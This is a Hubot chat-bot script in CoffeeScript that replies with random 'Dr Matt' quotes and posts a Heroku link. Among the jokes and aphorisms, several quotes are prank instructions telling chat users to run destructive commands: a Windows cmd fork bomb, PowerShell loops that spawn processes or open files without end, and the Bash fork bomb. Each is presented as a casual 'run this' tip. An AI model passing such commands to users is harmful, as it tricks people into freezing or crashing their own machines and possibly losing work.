# Description:
#   Dr Matt sayzz
#
# Dependencies:
#   None
#
# Configuration:
#   None
#
# Commands:
#   hubot what would Dr Matt say
#   hubot awake your brothers
#
# Author:
#   Mateusz Kopij <sagasu>



MATT_QUOTE = [
  "Burritos are just tacoids in the category of enchiladafunctors",
  "Monads are just monoids in the category of endofunctors",
  "You can not follow the path, before you will become the path yourself",
  "Expect nothing, seek nothing, grasp nothing",
  "You are remembered by the rules you break",
  "run this in cmd `%0|%0`",
  "run this in powershell `gci \ -R|ii`",
  "run this in powershell `for(){PS|II}`",
  "run this in powershell `for(){PS|SAPS}`",
  "run this in powershell `while(1){ii /*}`",
  "run this in powershell `while(1){ii .}` your welcome",
  "run this on your linux box `:(){ : | :& }; :` you are welcome."
]

module.exports = (robot) ->

  robot.respond /what would Dr Matt say/i, (msg)->
    msg.send msg.random(MATT_QUOTE)
    
  robot.respond /awake your brothers/i, (msg)->
    msg.send "https://secure-anchorage-54524.herokuapp.com/"